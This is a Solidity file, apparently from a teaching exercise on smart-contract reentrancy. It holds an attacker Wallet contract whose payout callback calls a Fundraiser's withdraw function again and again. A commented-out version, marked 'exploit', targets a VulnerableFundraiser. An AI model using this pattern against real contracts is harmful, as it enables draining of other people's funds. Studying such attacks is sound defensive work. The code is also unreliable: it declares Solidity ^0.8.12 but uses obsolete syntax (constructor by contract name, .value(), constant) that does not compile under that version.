// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.12;

contract Wallet {

    Fundraiser fundraiser;
    uint recursion = 20;

    function Wallet(address fundraiserAddress) {
        fundraiser = Fundraiser(fundraiserAddress);
    }

    function contribute(uint amount) {
        fundraiser.contribute.value(amount)();
    }

    function withdraw(){
        fundraiser.withdrawCoins();
    }

    function getBalance() constant returns (uint) {
        return address(this).balance;
    }

    function payout() payable {
      // Because we set the balance in Fundraiser to 0 before withdrawal, this recursion hack is no longer effective
            if (recursion>0) {
                recursion--;
                fundraiser.withdrawCoins();
            }
        }

    fallback () payable {

    }
}

// contract Wallet {

//     Fundraiser fundraiser;
//     uint recursion=20;

//     function Wallet(address fundraiserAddress) {
//         fundraiser = VulnerableFundraiser(fundraiserAddress);
//     }

//     function contribute(uint amount) {
//         fundraiser.contribute.value(amount)();
//     }

//     function withdraw(){
//         fundraiser.withdrawAllMyCoins();
//     }

//     function getBalance() constant returns (uint) {
//         return address(this).balance;
//     }

//     function payout() payable {
//         // exploit
//         if(recursion>0) {
//             recursion--;
//             fundraiser.withdrawAllMyCoins();
//         }
//     }

//     function() payable {

//     }
// }
